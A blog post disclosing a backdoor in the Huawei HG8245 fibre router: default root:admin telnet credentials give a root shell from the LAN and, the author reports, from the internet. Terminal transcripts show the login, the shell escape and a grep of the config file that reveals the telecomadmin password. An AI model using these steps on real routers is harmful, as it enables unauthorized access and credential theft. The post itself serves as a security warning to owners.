---
layout: post
title:  HG8245 - Internet Backdoor and Remote Access
author: eka
tags:
- HG8245
- Huawei
- ONT
- Wifi Router
---

Hackers are very unlikely to break in to SOHO network from serial port, like in [this post](2015/05/07/hg8245-root-password-to-reveal-hidden-menu.html). This post is showing you that HG8245 can be exploited to get root access from the internet. The root password is permanently stored in the flash ROM and cannot be changed.

The setup was very easy. One computer was connected to HG8245 through a LAN cable. Then I ran telnet and use root:admin access. Voila, connection was established! The next commmand was easy, call the <code>shell</code>.

<!--more-->

<pre><code>telnet 192.168.1.1
Trying 192.168.1.1...
Connected to 192.168.1.1.
Escape character is '^]'.

Welcome Visiting Huawei Home Gateway
Copyright by Huawei Technologies Co., Ltd.

Login:root
Password:*****
WAP>shell

BusyBox v1.4.1 (2011-07-29 10:25:20 HKT) Built-in shell (ash)
Enter 'help' for a list of built-in commands.

WAP(Dopra Linux) # grep telecomadmin /mnt/jffs2/hw_ctree.xml
&lt;X_HW_WebUserInfoInstance InstanceID="2" UserName="telecomadmin" Password="nE7jA%5m" UserLevel="0" Enable="1"/&gt;
WAP(Dopra Linux) # </code></pre>

Alright... alright... probably because it is local, LAN access. What about telnetting from the internet? First, connect the HG8245 to your ISP provider and find its IP address. Then telnetting...

<pre><code>telnet 183.x.x.x
Trying 183.x.x.x...
Connected to 183.x.x.x.
Escape character is '^]'.

Welcome Visiting Huawei Home Gateway
Copyright by Huawei Technologies Co., Ltd.

Login:root
Password:*****
WAP>shell

BusyBox v1.4.1 (2011-07-29 10:25:20 HKT) Built-in shell (ash)
Enter 'help' for a list of built-in commands.

WAP(Dopra Linux) # grep telecomadmin /mnt/jffs2/hw_ctree.xml
&lt;X_HW_WebUserInfoInstance InstanceID="2" UserName="telecomadmin" Password="nE7jA%5m" UserLevel="0" Enable="1"/&gt;
WAP(Dopra Linux) # </code></pre>

Unbelievable! Super scary! Too easy to break in! Anyone owns one of this ONT should try to upgrade to the latest firmware. Better yet, install OpenWrt!
